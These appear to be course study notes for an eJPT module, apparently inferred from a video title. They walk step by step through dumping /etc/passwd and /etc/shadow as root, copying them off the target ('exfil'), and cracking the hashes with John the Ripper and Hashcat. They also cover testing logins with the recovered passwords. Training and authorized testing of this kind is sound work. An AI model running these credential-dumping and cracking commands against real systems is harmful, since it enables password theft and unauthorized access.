# What the video covers (Introduction / big picture)
Note: No transcript was provided; the following is a careful, conservative summary inferred from the filename and typical eJPT workflow.

This module demonstrates how to:
- Safely obtain Linux password hashes (from /etc/passwd and /etc/shadow) during authorized engagements.
- Prepare those files for cracking using unshadow (John the Ripper).
- Crack the hashes with John the Ripper and/or Hashcat using common wordlists and rules.
- Interpret results and verify access (e.g., su/ssh) within scope.

It emphasizes offline password cracking of Linux crypt(3)-style hashes ($1$ MD5, $5$ SHA-256, $6$ SHA-512; possibly $y$ yescrypt on newer systems).

Only perform these steps on systems you own or have explicit authorization to test.

# Flow (ordered)
1. Confirm authorization and scope.
2. Gain shell with sufficient privileges (root or sudo) on the Linux target.
3. Dump /etc/passwd and /etc/shadow from the target.
4. Transfer the files to your attack box.
5. Prepare hash input:
   - For John: use unshadow to combine passwd + shadow.
   - For Hashcat: extract the second field (hashes) from shadow.
6. Identify hash type by signature: $1$, $5$, $6$ (and $y$ for yescrypt).
7. Crack with a wordlist (e.g., rockyou.txt) and optional rules.
8. Review cracked credentials; attempt valid logins within scope.
9. Record findings; secure/delete artifacts.

# Tools highlighted
- Linux system files: /etc/passwd, /etc/shadow
- John the Ripper (john, unshadow)
- Hashcat
- Wordlists: rockyou.txt (Kali: /usr/share/wordlists/rockyou.txt.gz)
- Transfer utilities: scp, sftp
- Shell utilities: awk, cut, grep, head
- Optional: hash identification via signatures in the hash itself ($id$)

# Typical command walkthrough (detailed, copy-paste friendly)

Only run on authorized targets. Replace TARGET, USER, and paths as needed.

## 0) Prep on attack box (Kali)
```bash
# Ensure tools and wordlist are present
sudo apt update
sudo apt install -y john hashcat wordlists

# Decompress rockyou if needed
[ -f /usr/share/wordlists/rockyou.txt ] || sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
```

## 1) On the target: dump passwd and shadow
Requires root or sudo.
```bash
# Create protected copies you can exfiltrate
sudo sh -c 'umask 077; cat /etc/passwd > /tmp/passwd && cat /etc/shadow > /tmp/shadow && ls -l /tmp/passwd /tmp/shadow'
```

## 2) Transfer to your attack box
From your attack box:
```bash
# Using scp (adjust user/host)
scp USER@TARGET:/tmp/passwd .
scp USER@TARGET:/tmp/shadow .
```

## 3A) Crack with John the Ripper (recommended for most Linux hashes)
```bash
# Prepare: combine passwd + shadow
unshadow passwd shadow > unshadowed.txt

# Quick wordlist attack
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Optional: try formats explicitly if needed (auto-detect usually works)
# john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
# john --format=md5crypt    --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
# john --format=sha256crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Optional: add mangling rules to improve success
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo unshadowed.txt

# Check progress / cracked creds
john --status
john --show unshadowed.txt
```

Common file locations:
- John potfile: ~/.john/john.pot

## 3B) Crack with Hashcat (extract only the hashes)
Identify hash type by the prefix in the hash field:
- $6$ -> sha512crypt (Hashcat -m 1800)
- $5$ -> sha256crypt (Hashcat -m 7400)
- $1$ -> md5crypt    (Hashcat -m 500)
- $2a$, $2b$, $2y$ -> bcrypt (Hashcat -m 3200)
- $y$ -> yescrypt (use John; Hashcat mode depends on version, check: hashcat -h | grep -i yescrypt)

Prepare the hash list:
```bash
# Extract just the hash field (field 2) from shadow
awk -F: 'length($2)>0 && $2 !~ /^[*!]$/ {print $2}' shadow > hashes.txt

# Inspect a few to decide mode
head -n 5 hashes.txt
```

Run Hashcat (example for $6$ sha512crypt):
```bash
# Basic wordlist attack
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With a common rule set
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked results
hashcat --show -m 1800 hashes.txt
```

Other modes:
```bash
# sha256crypt ($5$)
hashcat -m 7400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# md5crypt ($1$)
hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt ($2b$)
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Common file locations:
- Hashcat potfile: ~/.hashcat/hashcat.potfile

## 4) Validate credentials (within scope)
```bash
# Try a local switch user on target (if you still have shell)
su - USERNAME

# Or SSH with cracked credentials
ssh USERNAME@TARGET
```

## 5) Clean up artifacts
```bash
# On the target
sudo shred -u /tmp/passwd /tmp/shadow 2>/dev/null || sudo rm -f /tmp/passwd /tmp/shadow

# On your box (as per policy)
rm -f passwd shadow unshadowed.txt hashes.txt
```

# Practical tips
- Hash identification: The second field in /etc/shadow begins with $id$:
  - $1$ md5crypt, $5$ sha256crypt, $6$ sha512crypt, $2x/$2y$ bcrypt, $y$ yescrypt.
- Prefer John for yescrypt ($y$), as it has strong support; Hashcat support depends on version.
- Use unshadow for John to preserve username mapping; john --show then prints user:pass pairs.
- Start with wordlist attacks (rockyou.txt) plus light rules (best64.rule); escalate to heavier rules/incremental only if needed.
- Filter out locked/disabled accounts: entries with ! or * in the shadow password field.
- Performance:
  - CPU-bound crypt hashes ($5$, $6$, $y$) are slow; GPU advantage is limited compared to fast hashes, but Hashcat still helps.
  - Bcrypt is intentionally slow; expect longer runs.
- Keep evidence: capture cracked creds and hash types in your report with timestamps and tool versions.
- Ethical hygiene: minimize footprint on target, use temporary directories, and securely delete artifacts per engagement policy.

# Minimal cheat sheet (one-screen flow)
```bash
# 1) Dump (target, as root/sudo)
sudo sh -c 'umask 077; cat /etc/passwd > /tmp/passwd; cat /etc/shadow > /tmp/shadow'

# 2) Exfil (attacker)
scp USER@TARGET:/tmp/passwd .
scp USER@TARGET:/tmp/shadow .

# 3A) John route
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
john --show unshadowed.txt

# 3B) Hashcat route
awk -F: 'length($2)>0 && $2 !~ /^[*!]$/{print $2}' shadow > hashes.txt
head -n1 hashes.txt   # decide mode: $6$->1800, $5$->7400, $1$->500, $2b$->3200
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 1800 hashes.txt

# 4) Validate (within scope)
ssh USER@TARGET

# 5) Cleanup
sudo rm -f /tmp/passwd /tmp/shadow        # on target
rm -f passwd shadow unshadowed.txt hashes.txt  # on attacker
```

# Summary
This lesson walks through authorized collection of Linux password hashes from /etc/passwd and /etc/shadow, preparing them for cracking, and recovering plaintext passwords. You:
- Dump the files with root/sudo, transfer them off-host, and combine them using unshadow for John or extract the hash field for Hashcat.
- Identify the hash type by its $id$ and select the appropriate cracking mode.
- Run wordlist-based cracking (rockyou + rules), then review cracked credentials and test access within scope.
- Document findings and clean up artifacts to maintain operational security.